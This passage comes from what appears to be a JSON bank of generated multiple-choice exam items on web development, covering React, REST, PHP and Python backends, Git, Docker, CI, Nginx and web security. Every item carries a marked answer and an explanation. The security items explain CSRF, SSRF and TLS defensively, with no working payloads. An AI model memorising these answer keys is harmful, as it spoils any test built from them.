+  "q": "What happens on the last line?\n\nconst res = await fetch(url);\nconst text = await res.text();\nconst data = await res.json();",
+  "opts": {
+   "A": "data is parsed correctly, because text() and json() both read from an internally buffered copy",
+   "B": "json() resolves with null once text() has already been called",
+   "C": "json() rejects with a TypeError, because the response body stream has already been consumed",
+   "D": "It fails only when the response's Content-Type is not application/json"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "A Response body is a one-shot stream: the first read sets bodyUsed to true, and any later body-reading method returns a promise rejected with a TypeError. There is no internal buffer to re-read, so the fix is either res.clone() before the first read or JSON.parse(text); note that json() ignores Content-Type entirely and parses whatever bytes it is given.",
+  "id": "GEN-T2U2-034"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L05",
+  "sub": "Frontend frameworks: components, routing, state management and API integration",
+  "q": "A React list is rendered as `items.map((item, i) => <Row key={i} item={item} />)`, and each `Row` holds its own local expanded/collapsed state. An item is then deleted from the middle of the array. What is the most likely visible bug?",
+  "opts": {
+   "A": "React logs a duplicate-key warning and refuses to render the rows after the deleted one",
+   "B": "Every row unmounts and remounts, so all rows reset to collapsed",
+   "C": "The expanded/collapsed state stays attached to list positions, so rows that shifted up now show the state that belonged to the row previously at that index",
+   "D": "The list stops re-rendering until the parent component is remounted"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "With the array index as the key, reconciliation matches a component to a position rather than to an item, so deleting from the middle leaves each surviving row inheriting the local state of whatever previously sat at its new index. Full unmount-and-remount of every row is what a stable unique key would avoid, not what an index key causes — index keys make React reuse instances, which is exactly the problem.",
+  "id": "GEN-T2U2-035"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L05",
+  "sub": "Frontend frameworks: components, routing, state management and API integration",
+  "q": "A React component holds `const [items, setItems] = useState([])`. Its add handler runs `items.push(newItem); setItems(items);`. What happens when the handler fires?",
+  "opts": {
+   "A": "React throws an error because component state was mutated directly",
+   "B": "The UI does not update, because setItems receives the same array reference and React bails out of the re-render",
+   "C": "The component re-renders, but the newly pushed item is missing from the output",
+   "D": "The component re-renders twice, briefly showing the new item duplicated"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "React compares the next state to the current one with Object.is, and a mutated-then-reassigned array is the same reference, so the update is skipped and the pushed item never appears; passing a new array such as `setItems([...items, newItem])` is the fix. React does not throw on direct mutation — it simply cannot detect the change, which is why the failure is silent rather than an error.",
+  "id": "GEN-T2U2-036"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L05",
+  "sub": "Frontend frameworks: components, routing, state management and API integration",
+  "q": "A dashboard has a persistent sidebar and header, while three sub-pages swap in and out of the content area as the URL changes. The sidebar must not re-mount or lose its scroll position during those swaps. Which client-side router feature describes this?",
+  "opts": {
+   "A": "Nested routes, where the child route renders into an outlet placed inside the parent route's component so the parent stays mounted",
+   "B": "Hash-based routing, which keeps the layout portion out of the URL path",
+   "C": "Route guards, which block navigation until the surrounding layout has finished loading",
+   "D": "Programmatic navigation, pushing each sub-page URL onto the history stack from an event handler"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "Nested routing lets a parent route own persistent chrome and designate an outlet slot into which the matched child route renders, so only the child subtree changes on navigation. Programmatic navigation only chooses when to navigate; it says nothing about which parts of the tree survive the navigation.",
+  "id": "GEN-T2U2-037"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L05",
+  "sub": "Frontend frameworks: components, routing, state management and API integration",
+  "q": "An SPA uses a client-side route guard that redirects non-admin users away from /admin. A tester with an ordinary account opens devtools, calls GET /api/admin/users directly and receives the full data. What does this demonstrate?",
+  "opts": {
+   "A": "The guard was registered on the parent route only and must be repeated on every child route",
+   "B": "The access token should be stored in an httpOnly cookie instead of localStorage",
+   "C": "The admin screens should be moved into a lazy-loaded chunk so non-admins never download that code",
+   "D": "Route guards only decide what the SPA renders; authorization must be enforced by the server on every API request"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "Everything a browser client does is under the user's control, so a guard is a navigation convenience and the API is the only place an access decision can actually be enforced. Lazy-loading the admin chunk is reasonable hygiene but changes nothing here — the endpoint was called directly, without loading any of the app's admin code.",
+  "id": "GEN-T2U2-038"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L05",
+  "sub": "Frontend frameworks: components, routing, state management and API integration",
+  "q": "A Vite-built SPA keeps a third-party API key in `.env` as `VITE_API_KEY`, reads it via `import.meta.env.VITE_API_KEY`, and calls the third-party API straight from the browser. The `.env` file is gitignored. Why is the key still exposed?",
+  "opts": {
+   "A": "The `.env` file is copied into the `dist/` output and served as a static asset",
+   "B": "Vite substitutes the literal value into the JavaScript bundle at build time, so it ships to every visitor and is readable in devtools",
+   "C": "`import.meta.env` is resolved by an HTTP request to the origin server on page load, exposing the value in the network tab",
+   "D": "The value is only exposed if source maps are deployed alongside the production bundle"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "Vite performs a static text replacement of `import.meta.env.VITE_*` during the build, so the secret becomes a string literal inside the shipped JavaScript regardless of how the `.env` file is handled in version control; a browser-callable secret must instead be proxied through a backend. Source maps are irrelevant — the literal is present in the minified bundle whether or not maps are published.",
+  "id": "GEN-T2U2-039"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L05",
+  "sub": "Frontend frameworks: components, routing, state management and API integration",
+  "q": "In an SPA, most navigation uses the router's link component, but one menu entry was written as a plain `<a href='/reports'>`. Clicking it reaches the right page, yet the page visibly reloads and the app's in-memory store is empty afterwards. Why?",
+  "opts": {
+   "A": "The anchor is missing the router's configured base path, so the client router cannot match it against its route table",
+   "B": "The web server has no history fallback rule, so it re-serves index.html from cache instead of the route",
+   "C": "A plain anchor performs a full document navigation, so the browser tears down the running JavaScript context and boots a fresh app instance, discarding in-memory state",
+   "D": "The router intercepts clicks only on elements rendered inside its outlet, so the anchor must be moved inside the outlet"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "Router link components exist precisely to intercept the click and call the History API instead of letting the browser navigate, which is what preserves the running app and its store. A missing history fallback would produce a 404 on reload, not a successful-but-full reload, so it does not explain this symptom.",
+  "id": "GEN-T2U2-040"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L05",
+  "sub": "Frontend frameworks: components, routing, state management and API integration",
+  "q": "A team already runs a global client-state store (Redux, Pinia or NgRx) and additionally adopts a dedicated server-state library such as TanStack Query for its REST calls. What does the server-state library primarily add?",
+  "opts": {
+   "A": "Caching keyed by request, deduplication of in-flight identical requests, staleness tracking and background refetching for data the server owns",
+   "B": "A single immutable state tree that makes UI state transitions predictable and replayable",
+   "C": "Enforcement of one-way data flow from parent components down to child components",
+   "D": "Persistence of the entire application state to localStorage so it survives a page reload"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "Remote data is a cache of something another system owns, so it needs cache keys, invalidation, deduplication and refetch-on-stale — concerns a general-purpose store does not model. A single predictable state tree is what the store already provides, so it cannot be what the second library is being added for.",
+  "id": "GEN-T2U2-041"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L05",
+  "sub": "Frontend frameworks: components, routing, state management and API integration",
+  "q": "A task list flips a to-do's `completed` flag in local state immediately and fires the PATCH afterwards, so the checkbox responds instantly. Beyond applying the change early, what must this optimistic-update pattern also implement to remain correct?",
+  "opts": {
+   "A": "A debounce, so rapid repeated toggles collapse into a single request",
+   "B": "A longer request timeout, so the PATCH still completes on slow connections",
+   "C": "Polling the server every few seconds to re-synchronise the list",
+   "D": "A rollback that restores the previous value, and surfaces the failure, if the request is rejected"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "An optimistic update asserts a server outcome before it is known, so the pattern is only sound if the pre-update snapshot is retained and reapplied when the request fails, otherwise the UI silently diverges from the database. Debouncing is a request-volume optimisation and does nothing about a rejected write.",
+  "id": "GEN-T2U2-042"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L05",
+  "sub": "Frontend frameworks: components, routing, state management and API integration",
+  "q": "A React app renders `<AuthContext.Provider value={{ user, setUser }}>` high in the tree. Profiling shows that every consumer of that context re-renders whenever the provider's own component re-renders, even when `user` is unchanged. What explains this?",
+  "opts": {
+   "A": "Context providers re-run all consumers on every render by design; the provider value is never compared",
+   "B": "Consumers must be wrapped in `React.memo` to skip re-renders caused by context",
+   "C": "The inline object literal produces a new value reference on each render, and consumers re-render when the provider value is not referentially equal to the previous one",
+   "D": "`setUser` must be excluded from the context value, because function identities are never stable across renders"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "React compares the provider's value by reference, and `{{ user, setUser }}` allocates a fresh object each render, so memoising the value (for example with useMemo) is what stops the cascade. React.memo is the tempting wrong answer: it compares props and does not prevent a context update from re-rendering a consumer.",
+  "id": "GEN-T2U2-043"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L06",
+  "sub": "Backend development in PHP and Python: REST APIs, CRUD, middleware, auth, sessions and ORM",
+  "q": "A POST to /api/v1/orders succeeds and a new order resource now exists at its own URI. Which status code and response header pairing is the conventional REST result for this?",
+  "opts": {
+   "A": "200 OK, with a Content-Location header naming the new order",
+   "B": "202 Accepted, with a Retry-After header telling the client when to look again",
+   "C": "201 Created, with a Location header naming the new order",
+   "D": "204 No Content, with an ETag header for the new order"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "A resource that has been created is reported with 201 Created, and the URI of the thing just created is advertised in the Location header. 202 Accepted is the tempting alternative but it means the work was only queued and no resource necessarily exists yet, which contradicts a stem that says the order was created.",
+  "id": "GEN-T2U2-044"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L06",
+  "sub": "Backend development in PHP and Python: REST APIs, CRUD, middleware, auth, sessions and ORM",
+  "q": "A Django project served by Gunicorn's default synchronous workers must add a WebSocket endpoint for live order tracking. Why can this deployment not host that endpoint as it stands?",
+  "opts": {
+   "A": "Synchronous Gunicorn workers cannot terminate TLS, and WebSocket endpoints must be served over TLS",
+   "B": "WSGI models a request as a single call in and a single response out, with no representation for a long-lived bidirectional connection, so an ASGI server is required instead",
+   "C": "Django's ORM is synchronous, so a WebSocket handler would be unable to query the database at all",
+   "D": "WebSockets are carried over HTTP/2 streams, which synchronous Gunicorn workers do not implement"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "WSGI's contract is one callable invoked per request that returns one response body, which leaves no place for a connection that stays open and carries frames in both directions; ASGI was defined precisely to add that, and is what servers such as Uvicorn or Daphne speak. Option D is the plausible-sounding trap: the WebSocket handshake is an HTTP/1.1 Upgrade and does not depend on HTTP/2.",
+  "id": "GEN-T2U2-045"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L06",
+  "sub": "Backend development in PHP and Python: REST APIs, CRUD, middleware, auth, sessions and ORM",
+  "q": "A PHP login handler runs:\n\nsession_start();\n$_SESSION['user_id'] = 42;\nsession_regenerate_id(true);\n\nWhat is the state immediately after the third line?",
+  "opts": {
+   "A": "$_SESSION is now empty and the application must write user_id again under the new identifier",
+   "B": "The session identifier is unchanged; only the session cookie's expiry time has been refreshed",
+   "C": "$_SESSION still holds user_id 42 under a new identifier, and the old session's data remains valid server-side until garbage collection removes it",
+   "D": "$_SESSION still holds user_id 42 under a newly issued identifier, and the old session's server-side data has been deleted"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "session_regenerate_id() carries the current $_SESSION contents across to a freshly issued identifier, and its boolean argument controls whether the old session's server-side data is destroyed; passing true destroys it. Option C is exactly what happens when the argument is false or omitted, which is why the defence against session fixation is to regenerate with deletion at the moment privilege changes.",
+  "id": "GEN-T2U2-046"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L06",
+  "sub": "Backend development in PHP and Python: REST APIs, CRUD, middleware, auth, sessions and ORM",
+  "q": "An API endpoint requires a write scope. A request arrives bearing an OAuth 2.0 access token that is well-formed, correctly signed and unexpired, but whose granted scopes are read-only. Which HTTP status expresses this outcome?",
+  "opts": {
+   "A": "403 Forbidden",
+   "B": "401 Unauthorized",
+   "C": "400 Bad Request",
+   "D": "422 Unprocessable Content"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "The server has successfully authenticated the caller and is refusing on authorization grounds, which is what 403 means. 401 is the frequent wrong pick: it signals that valid authentication credentials are absent or unusable, and re-presenting the same token would be the client's only recourse — pointless here, since the token is fine and the permission is not.",
+  "id": "GEN-T2U2-047"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L06",
+  "sub": "Backend development in PHP and Python: REST APIs, CRUD, middleware, auth, sessions and ORM",
+  "q": "A single-page app on https://app.example.com calls an API on https://api.example.com. The browser's preflight OPTIONS request returns 401, so no cross-origin call ever completes — yet the identical requests succeed from curl with the same valid token. What is the most likely cause?",
+  "opts": {
+   "A": "The API omits the Access-Control-Allow-Credentials header from its responses",
+   "B": "Browsers strip the Authorization header from preflight requests only when the target is served over HTTPS",
+   "C": "The authentication middleware is registered ahead of the CORS middleware, so it rejects the deliberately credential-less preflight before CORS can answer it",
+   "D": "OPTIONS is a non-idempotent method, so the API's rate-limiting middleware refuses to serve it"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "A preflight OPTIONS request is generated by the browser and carries neither Authorization headers nor cookies by design, so any auth middleware sitting in front of the CORS middleware sees an unauthenticated request and answers 401 before the CORS headers are ever attached; registering CORS first, or exempting OPTIONS from auth, resolves it. A missing Access-Control-Allow-Credentials header would show up as a browser-blocked response on the real request, not as a 401 on the preflight.",
+  "id": "GEN-T2U2-048"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L06",
+  "sub": "Backend development in PHP and Python: REST APIs, CRUD, middleware, auth, sessions and ORM",
+  "q": "Doctrine ORM and Eloquent are both PHP persistence libraries, but they implement different data-access patterns. Which statement characterises the difference correctly?",
+  "opts": {
+   "A": "Eloquent is a Data Mapper whose plain models are persisted by a separate EntityManager, while Doctrine entities save themselves",
+   "B": "Eloquent is an Active Record implementation, where a model both maps a row and knows how to persist itself, while Doctrine is a Data Mapper that keeps entities free of persistence logic and delegates it to an EntityManager",
+   "C": "Both are Active Record implementations, differing only in whether mappings are declared as attributes or as properties on the model class",
+   "D": "Doctrine is an Active Record implementation tuned for read-heavy workloads, while Eloquent is a query builder that performs no object mapping"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "Eloquent models inherit persistence behaviour — save(), delete() and the query interface live on the model itself, the defining trait of Active Record — whereas a Doctrine entity is an ordinary PHP object with no knowledge of the database, and the EntityManager performs the mapping. Option A is the same distinction stated with the two libraries swapped, which is the mistake worth catching.",
+  "id": "GEN-T2U2-049"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L06",
+  "sub": "Backend development in PHP and Python: REST APIs, CRUD, middleware, auth, sessions and ORM",
+  "q": "In a Python service using the SQLAlchemy ORM:\n\nuser = session.get(User, 1)\nuser.email = \"new@example.com\"\nsession.commit()\n\nNo UPDATE statement appears anywhere in the code, yet the row changes. Which ORM mechanism accounts for this?",
+  "opts": {
+   "A": "The unit-of-work pattern — the Session tracks attribute changes on the instances it manages and flushes the resulting UPDATE as part of the commit",
+   "B": "session.get() returns a write-through proxy that pushes each attribute assignment to the database as the assignment happens",
+   "C": "The commit re-reads the object and rewrites every column of the row unconditionally, so no change tracking is needed",
+   "D": "The Session runs in autocommit mode by default, so each attribute assignment becomes its own transaction"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "Objects loaded through a Session stay in its identity map, mutating a mapped attribute marks the instance dirty, and the flush that precedes commit emits an UPDATE covering the changed columns — that accumulate-then-flush behaviour is the unit-of-work pattern. Option B is the intuitive but wrong model: nothing whatsoever reaches the database at assignment time, which is why rolling back discards the edit.",
+  "id": "GEN-T2U2-050"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L06",
+  "sub": "Backend development in PHP and Python: REST APIs, CRUD, middleware, auth, sessions and ORM",
+  "q": "An API implements optimistic concurrency: clients GET a resource, receive an ETag, and echo it in an If-Match header on the follow-up PUT. Two clients edit the same resource, and the second PUT arrives carrying an ETag that no longer matches the stored representation. Which status should the server return?",
+  "opts": {
+   "A": "409 Conflict",
+   "B": "428 Precondition Required",
+   "C": "423 Locked",
+   "D": "412 Precondition Failed"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "HTTP semantics say that when a conditional request header such as If-Match evaluates to false, the server must not perform the method and answers 412 Precondition Failed. 428 Precondition Required is the inverse situation — the server demanding a conditional header that the client failed to send — and here the client did send one.",
+  "id": "GEN-T2U2-051"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L06",
+  "sub": "Backend development in PHP and Python: REST APIs, CRUD, middleware, auth, sessions and ORM",
+  "q": "A PHP application stores credentials as password_hash($pw, PASSWORD_DEFAULT). A later PHP upgrade changes what PASSWORD_DEFAULT resolves to, and the team wants existing users silently migrated at their next successful login. Which built-in function performs exactly the check of whether a stored hash was produced with different parameters and therefore ought to be recomputed?",
+  "opts": {
+   "A": "password_get_info()",
+   "B": "password_needs_rehash()",
+   "C": "hash_equals()",
+   "D": "password_verify(), passing the desired algorithm as a third argument"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "password_needs_rehash() compares the algorithm and options embedded in an existing hash against the ones supplied and returns true when they differ, so it is called right after a successful verify — the one moment the plaintext is available to rehash. password_get_info() merely reports what a hash was made with and makes no comparison and no decision, and password_verify() takes only the password and the hash.",
+  "id": "GEN-T2U2-052"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L07",
+  "sub": "Git version control, Docker, CI/CD, Linux administration, Nginx and deployment",
+  "q": "A developer adds the line `config/secrets.env` to the repository's root `.gitignore` and commits it, but `git status` continues to report modifications to `config/secrets.env`. What explains this, and what stops it?",
+  "opts": {
+   "A": "`.gitignore` entries must be anchored with a leading slash to match a path inside a subdirectory, so the entry should read `/config/secrets.env`",
+   "B": "A `.gitignore` in the repository root does not apply to subdirectories, so a separate `.gitignore` has to be placed inside `config/`",
+   "C": "`.gitignore` is consulted only for untracked paths, so a file already in the index stays tracked; `git rm --cached config/secrets.env` and a commit stop it being tracked",
+   "D": "An ignore rule takes effect only after `.gitignore` itself is pushed to the remote, so the entry does nothing until the branch is pushed"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "Ignore rules are applied when Git decides whether to start tracking an untracked path; a path already recorded in the index is unaffected, so it must be removed from the index with `git rm --cached` while being left on disk. The leading-slash option is wrong because a slash only anchors the pattern to the repository root, which `config/secrets.env` already is — anchoring was never the problem.",
+  "id": "GEN-T2U2-053"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L07",
+  "sub": "Git version control, Docker, CI/CD, Linux administration, Nginx and deployment",
+  "q": "A feature branch has three commits that exist only locally. The developer runs `git reset --soft HEAD~2`. What is the state of the branch, index and working tree immediately afterwards?",
+  "opts": {
+   "A": "HEAD moves back two commits and the changes those commits introduced are discarded from both the index and the working tree",
+   "B": "HEAD moves back two commits, the changes those commits introduced are left staged in the index, and the working tree is untouched",
+   "C": "HEAD moves back two commits and the changes those commits introduced appear as unstaged modifications, with the index matching the new HEAD",
+   "D": "The branch pointer stays on the newest commit and only the index is rewound by two commits"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "`--soft` moves the branch ref and HEAD only, leaving the index and working tree exactly as they were, which is why the squashed content shows up already staged and ready to be recommitted as one commit. The unstaged-modifications option describes `--mixed`, the default, which resets the index to the new HEAD but not the working tree; wholesale discarding is `--hard`.",
+  "id": "GEN-T2U2-054"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L07",
+  "sub": "Git version control, Docker, CI/CD, Linux administration, Nginx and deployment",
+  "q": "A Node web application's Dockerfile contains, in this order:\n\n    COPY . .\n    RUN npm ci\n\nEvery build after a one-line source edit re-runs the full dependency install. Which change restores build-cache reuse for the install step?",
+  "opts": {
+   "A": "Move `RUN npm ci` above `COPY . .`, leaving both lines otherwise unchanged",
+   "B": "Add `--no-cache` to the `npm ci` invocation",
+   "C": "Replace `COPY . .` with `ADD . .`",
+   "D": "Copy `package.json` and `package-lock.json` alone, run `npm ci`, and only then `COPY . .`"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "A layer's cache entry is invalidated when the contents it copies change, so copying the whole source tree before installing makes any source edit invalidate the install layer; copying just the manifest and lockfile first means the install layer is only rebuilt when dependencies actually change. Simply hoisting `RUN npm ci` above `COPY . .` fails outright, because at that point no `package.json` exists in the image for npm to read.",
+  "id": "GEN-T2U2-055"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L07",
+  "sub": "Git version control, Docker, CI/CD, Linux administration, Nginx and deployment",
+  "q": "A React application is packaged with a multi-stage Dockerfile whose final stage starts from `nginx:alpine` and copies only the built `dist/` directory out of the Node build stage. What is the principal advantage over a single-stage image that keeps the Node toolchain and serves the build itself?",
+  "opts": {
+   "A": "The shipped image contains no Node runtime, compilers or dev dependencies, which cuts both image size and the attack surface that has to be patched",
+   "B": "The intermediate build stage's layers are pushed alongside the final image and shared with other images, lowering total registry storage",
+   "C": "Nginx negotiates HTTP/3 for the static assets by default, which a Node-based static server cannot do",
+   "D": "The stages of a multi-stage build run in parallel, so the dependency install overlaps with the production bundle step"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "The value of the pattern is that only the artefacts explicitly copied into the final stage survive into the shipped image, so build-time tooling and dev dependencies never become part of the deployed surface. The registry-storage option inverts the mechanism: intermediate stages are not part of the resulting image and are not pushed at all.",
+  "id": "GEN-T2U2-056"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L07",
+  "sub": "Git version control, Docker, CI/CD, Linux administration, Nginx and deployment",
+  "q": "In the install step of a CI job for a Node web application, why is `npm ci` normally preferred over `npm install`?",
+  "opts": {
+   "A": "`npm ci` installs only production dependencies, so devDependencies never reach the CI runner",
+   "B": "`npm ci` installs exactly the dependency tree recorded in `package-lock.json` and fails outright if the lockfile and `package.json` disagree, so the build is reproducible",
+   "C": "`npm ci` first refreshes `package-lock.json` to the newest versions permitted by the declared semver ranges, so CI always tests against current dependencies",
+   "D": "`npm ci` links packages from the runner's global cache instead of creating a local `node_modules` directory, so nothing has to be written to disk"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "`npm ci` treats the lockfile as authoritative rather than as a hint, so it cannot silently resolve a different version than a developer got, and a lockfile that has drifted out of sync with `package.json` breaks the build instead of being quietly rewritten. The devDependencies option is wrong because omitting them is a separate choice controlled by `--omit=dev`; `npm ci` installs the full tree by default, which CI needs in order to run tests and linters.",
+  "id": "GEN-T2U2-057"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L07",
+  "sub": "Git version control, Docker, CI/CD, Linux administration, Nginx and deployment",
+  "q": "A web application's pipeline compiles the application from source once for the staging deployment and again for the production deployment, both from the same Git commit. Production deployments occasionally misbehave in ways the staging run that approved them did not. Which pipeline change most directly eliminates this class of failure?",
+  "opts": {
+   "A": "Pin the CI runner image to a fixed tag so that both builds begin from an identical base operating system",
+   "B": "Tag the Git commit before the production build so that both deployments are traceable to a single revision",
+   "C": "Build the artefact once and promote that same immutable artefact from staging into production, supplying environment-specific values as configuration at deploy time",
+   "D": "Re-run the full test suite against the production environment immediately after every deployment"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "Two builds are two artefacts, and anything non-deterministic in the build — a floating transitive dependency, a differing toolchain, a stale cache — means the thing tested in staging is not the thing running in production; building once and promoting the identical artefact removes the divergence by construction. Pinning the runner image narrows one source of drift but still produces two separately built artefacts, so the failure mode survives.",
+  "id": "GEN-T2U2-058"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L07",
+  "sub": "Git version control, Docker, CI/CD, Linux administration, Nginx and deployment",
+  "q": "A Django application served by Gunicorn is managed as a systemd service on a Linux server. Which setting in its unit file causes systemd to bring the service back automatically when the process exits with a non-zero status?",
+  "opts": {
+   "A": "`Restart=on-failure` in the `[Service]` section",
+   "B": "`WantedBy=multi-user.target` in the `[Install]` section",
+   "C": "`After=network.target` in the `[Unit]` section",
+   "D": "`RemainAfterExit=yes` in the `[Service]` section"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "`Restart=on-failure` is the directive that tells systemd to restart the unit when it terminates with a non-zero exit code or is killed by a signal. `RemainAfterExit=yes` is close in appearance but does the opposite of what is wanted: it makes systemd regard the unit as still active after its process has exited, so nothing is restarted; `WantedBy` only governs whether the unit starts at boot when enabled.",
+  "id": "GEN-T2U2-059"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L07",
+  "sub": "Git version control, Docker, CI/CD, Linux administration, Nginx and deployment",
+  "q": "Nginx terminates TLS at the edge and reverse-proxies to an application on 127.0.0.1:8000. The application's access log records every request as coming from 127.0.0.1. Assuming the application is already configured to trust a forwarded client-address header, which line added to the proxying `location` block gives it the real client address?",
+  "opts": {
+   "A": "`proxy_set_header Host $host;`",
+   "B": "`proxy_pass_request_headers on;`",
+   "C": "`real_ip_header X-Forwarded-For;`",
+   "D": "`proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;`"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "From the application's point of view the TCP peer genuinely is Nginx on the loopback address, so the client address has to be carried in a header that Nginx sets on the upstream request; `$proxy_add_x_forwarded_for` appends `$remote_addr` to any inbound `X-Forwarded-For` value. `real_ip_header` looks apt but solves the mirror-image problem — it tells *Nginx* to take its own `$remote_addr` from a header when Nginx itself sits behind another proxy, and it changes nothing about what the upstream receives.",
+  "id": "GEN-T2U2-060"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L07",
+  "sub": "Git version control, Docker, CI/CD, Linux administration, Nginx and deployment",
+  "q": "A client-side-routed single-page application is served by Nginx from `/var/www/app`, which contains `index.html` and a hashed asset bundle. Navigating within the app works, but reloading the browser on `/dashboard` returns 404. Which directive in the `location /` block fixes it?",
+  "opts": {
+   "A": "`autoindex on;`",
+   "B": "`try_files $uri $uri/ /index.html;`",
+   "C": "`index index.html index.htm;`",
+   "D": "`rewrite ^/dashboard$ / permanent;`"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "`/dashboard` exists only as a route inside the JavaScript router, not as a file on disk, so Nginx must fall back to serving `index.html` for any path it cannot resolve and let the client-side router read the URL; `try_files` with `/index.html` as its final fallback does exactly that while still serving real files such as the asset bundle directly. The `index` directive does not help because it only chooses a default file for requests that resolve to a directory, and `/dashboard` resolves to nothing at all.",
+  "id": "GEN-T2U2-061"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L08",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "An application's session cookie is set with SameSite=Lax. Which request originating from an attacker-controlled page will still arrive at the application carrying that cookie?",
+  "opts": {
+   "A": "An auto-submitting cross-site POST form targeting an application endpoint",
+   "B": "A cross-origin fetch() to the application issued with credentials: 'include'",
+   "C": "A top-level navigation to an application URL caused by the user clicking a link on the attacker's page",
+   "D": "An <img> element on the attacker's page whose src points at an application URL"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "SameSite=Lax withholds the cookie on all cross-site subresource and non-safe-method requests, but deliberately allows it on top-level navigations made with a safe method such as GET, so ordinary inbound links keep working. The auto-submitting POST form is the classic CSRF vector and is exactly what Lax blocks, which is why it is tempting but wrong.",
+  "id": "GEN-T2U2-062"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L08",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "A link-preview feature fetches any URL the user submits and returns the response body. An attacker submits a URL pointing at the cloud provider's link-local instance metadata endpoint and retrieves the instance's credentials. In the OWASP Top 10 (2021 edition), which category names this class of flaw directly?",
+  "opts": {
+   "A": "A01:2021 - Broken Access Control",
+   "B": "A03:2021 - Injection",
+   "C": "A05:2021 - Security Misconfiguration",
+   "D": "A10:2021 - Server-Side Request Forgery (SSRF)"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "SSRF is the flaw of making the server issue a request to a destination chosen by the user, and the 2021 edition added it as its own category at A10 precisely because URL-fetching features had become common. A01 Broken Access Control is the nearest competitor, but the failure here is not that an authorisation check was skipped - it is that the server was made into the attacker's HTTP client.",
+  "id": "GEN-T2U2-063"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L08",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "An adversary passively records a site's encrypted TLS traffic today and obtains the server's long-term private key two years later. Which property, if the connections had it, keeps the recorded traffic undecryptable?",
+  "opts": {
+   "A": "Record protection with an AEAD cipher such as AES-GCM",
+   "B": "Forward secrecy from an ephemeral (EC)DHE key exchange, so session keys are never recoverable from the certificate's key",
+   "C": "Certificate pinning in the client",
+   "D": "Strict-Transport-Security sent with a long max-age"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "Forward secrecy comes from deriving each session's keys through an ephemeral Diffie-Hellman exchange whose private values are discarded, so the certificate key only authenticates the handshake and never encrypts the session keys - which is why TLS 1.3 dropped static RSA key transport entirely. AES-GCM protects each record's confidentiality and integrity in transit but says nothing about how the keys were established, so it does not help against a later key compromise.",
+  "id": "GEN-T2U2-064"
+ },
+ {
+  "unit": "2",
+  "slug": "U2-L08",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "Users reach a portal by typing the bare domain name, and an on-path attacker strips the HTTP-to-HTTPS redirect on that very first request. Which measure protects a user who has never visited the site before?",
+  "opts": {
+   "A": "Getting the domain added to the browsers' HSTS preload list",
+   "B": "Sending Strict-Transport-Security with a two-year max-age and includeSubDomains on every HTTPS response",
+   "C": "Marking every cookie Secure and HttpOnly",
+   "D": "Publishing a CAA DNS record naming the site's certificate authority"
+  },
+  "ans": "A",
+  "conf": "high",
